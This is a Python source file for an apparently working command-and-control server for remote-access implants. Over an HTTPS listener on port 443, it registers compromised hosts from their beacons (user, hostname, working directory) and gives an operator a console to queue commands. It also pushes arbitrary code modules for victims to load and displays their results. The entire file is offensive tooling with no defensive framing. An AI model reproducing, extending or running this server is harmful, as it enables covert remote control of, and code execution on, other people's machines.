#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import urllib
import logging
import json
from io import BytesIO

import asyncio
import time
import sys
import os
import errno
import socket
import threading

import netifaces as ni

import prompt_toolkit
from prompt_toolkit import prompt, PromptSession
from prompt_toolkit.styles import Style
from prompt_toolkit.patch_stdout import patch_stdout

from colored import fg, bg, attr
import shlex
import pty

targets = []

target_info_all = {}

tasks = {}

target = None

params = ["target"]

style = Style.from_dict({
    # User input (default text).
    '':          '#ff0066',

    # Prompt.
    'username': '#cc4444',
    'at':       '#00aa00',
    'colon':    '#aa0000',
    'pound':    '#00aa00',
    'hostname':     '#00ffff bg:#0011bb',
    'ip':     '#0dd000 bg:#0011bb',
    'path':     'ansicyan underline',
})

sess = PromptSession()

curr_prompt = None

class TrashCollector(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, world!')

    def do_POST(self):
        global target
        global curr_prompt
        global loop

        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()

        post_data = urllib.parse.parse_qs(body.decode('utf-8'))
        #logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
        #        str(self.path), str(self.headers), str(post_data))

        host = self.headers["Host"].strip("\r\n")
        logging.info("Host: {} Data: {}".format(host, post_data))

        old_prompt = get_prompt(target_info_all.get(host, None))

        if host not in targets:
            targets.append(host)
            tasks[host] = []
            target_info_all[host] = post_data
            target_info_all[host]["ip"] = host 
            print("Target added: {}".format(host))
            if not target:
                target = host

        elif post_data.get("beacon", None) == ['True']:
            target_info_all[host] = post_data
            target_info_all[host]["ip"] = host 
        else:
            if type(post_data) is dict:
                for cmd in post_data.keys():
                    #print("\nCMD: {}".format(cmd))
                    res = post_data[cmd]
                    if type(res) is list and len(res) == 1:
                        res=res[0]
                    print(res)
            
            else:
                print(post_data)
        target_info = target_info_all[host]
        #print("{} vs {}".format(get_prompt(target_info), old_prompt))
        if get_prompt(target_info) != old_prompt and curr_prompt:
            pass
            #print("Cancelling prompt...")
            #loop.call_soon_threadsafe(lambda res="": curr_prompt.set_result(res))

        response = BytesIO()
        response.write(pop_task(host))
        self.wfile.write(response.getvalue())

    def log_message(self, format, *args):
        logging.info("%s - - [%s] %s" % (self.address_string(),self.log_date_time_string(),format%args))

def srv(ip, port):
    httpd = HTTPServer((ip, port), TrashCollector)

    httpd.socket = ssl.wrap_socket (httpd.socket, 
            keyfile="key.pem", 
            certfile='cert.pem', server_side=True)

    logging.basicConfig(filename='server.log', level=logging.INFO) 

    httpd.serve_forever()

def pop_task(target):
    t = tasks.get(target, None)
    if not t:
        return b'Standby...'
    else:
        return json.dumps(t.pop(0)).encode('utf-8')

def task(target, cmd, args):
    global tasks
    tasks[target].append({cmd:args})

def set(k,v):
    global target
    if k in params:
        globals()[k] = v
    else:
        #print("Settable params: {}".format(params))
        task(target, "set", (k, v))

def show(k):
    if k in globals():
        print(globals()[k])
    else:
        print("{} not set".format(k))

def read_attr(d, attr):
    res = d.get(attr, None)
    if type(res) is list:
        if len(res) > 0:
            res = res[0]
        else:
            res=None
    return res
        

def get_prompt(target_info):
    message = [('class:pound',    '# ')]
    if target_info is not None:
        message = [
            ('class:username', read_attr(target_info, 'usr')),
            ('class:at',       '@'),
            ('class:hostname',     read_attr(target_info, 'hostname')),
            ('class:ip',     "({})".format(read_attr(target_info, 'ip'))),
            ('class:colon',    ':'),
            ('class:path',     read_attr(target_info, 'cwd')),
            message[0]
        ]
    return message

def prompt(async_=False):
    target_info = target_info_all.get(target, None)
    return sess.prompt(get_prompt(target_info), style=style, async_=async_)

def load_module(filename):
    try:
        with open(filename) as module:
            mod = os.path.basename(filename)
            mod = os.path.splitext(mod)[0]

            code = module.read()
            task(target, 'load_module', (mod, code))
            
            print("Loading {} on {}".format(filename, target))
    except Exception as e:
        print("Could not read file {}".format(filename))
        print(e)

def do(cmd):
    try:
        if not cmd:
            return
        arr = shlex.split(cmd)
        c = arr[0]
        if c == "set":
            set(arr[1], arr[2] if len(arr) >1 else None)
        elif c == "show" or (c in globals() and not callable(globals()[c])):
            if c == "show":
                show(arr[1])
            else:
                show(c)
        elif c == "bash":
            print("Dropping to bash on host -- use 'exit' to return here")
            pty.spawn("/bin/bash")
        elif c == 'clear':
            prompt_toolkit.shortcuts.clear()
        elif c == "load_module":
            load_module(*arr[1:])
        elif c == "exit":
            print("Killing the server...")
            #sys.exit(1)
            os._exit(1)
        else:
            if not target:
                print('Set a target - try "show targets"')
            else:
                task(target, c, arr[1:])
    except Exception as e:
        print(e)

def make_opt(n, opt):
    return ('class:choice', "{: <4}{}\n".format("{})".format(n), opt))

def get_srv_ip():
    ip_map = [(i, ni.ifaddresses(i)[ni.AF_INET][0]['addr']) for i in ni.interfaces() ]
    r = range(len(ip_map))

    
    message = [make_opt(n, "{: <6}({})".format(ip_map[n][0], ip_map[n][1])) for n in r ] 
    
    message.append( ("class:choice", "\nPlease Select an IP to listen on [{}]:".format(1) ))
    while True:
        choice = prompt_toolkit.prompt(message, style=style)
        if not choice:
            choice = 1
        try:        
            return ip_map[int(choice)][1]
        except Exception as e:
            print("Invalid selection")
            
def get_srv_port(ip):
    default = "443"

    while True:
        message = [
            ("class:choice", "Please Select a Port to listen on [{}]:".format(default))
        ]
        choice = prompt_toolkit.prompt(message, style=style)
        if not choice:
            choice = default
        
        wait = False
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if type(choice) == str and choice.endswith("!"):
                wait = True
                choice=choice[0:-1]
                print("Waiting for Port {} to become available...".format(choice))

            try:
                choice = int(choice)
                s.bind((ip, choice))
                s.close()
                return choice
            except socket.error as e:
                if wait:
                    s.close()
                    time.sleep(1)
                    continue
                if e.errno == errno.EADDRINUSE:
                    print("Port is already in use. Enter {}! to bind when available or pick a different port".format(choice))
                    default = "{}!".format(choice)
                else:
                    # something else raised the socket.error exception
                    print(e)

                s.close()
                break

async def get_input():
    global curr_prompt
    dbg = 3
    while True:
        future = prompt(async_=True)
        #print("future: {}".format(future))
        #curr_prompt = future.to_asyncio_future()
        curr_prompt = future
        #print("prompt: {}".format(curr_prompt))
        #with patch_stdout():
        try:
            res = await future
            #print("await returned")
            do(res)
            #print("do({}) returned".format(res))
        except Exception as e:
            print("exception raised: {}".format(e))
            print(str(e))
            print(e.args)
            print(type(e).__name__)
            pass

        #if dbg <= 0:
        #    os._exit(1)
        dbg = dbg - 1

if __name__=="__main__":
    global loop
    ip = get_srv_ip()
    port = get_srv_port(ip)
    #Start thread in the background
    srv_thread = threading.Thread(target=srv, args=(ip, port))
    srv_thread.daemon = True
    srv_thread.start()

    prompt_toolkit.eventloop.defaults.use_asyncio_event_loop() 

    loop = asyncio.get_event_loop()
    # Blocking call which returns when the hello_world() coroutine is done
    loop.run_until_complete(get_input())
    loop.close()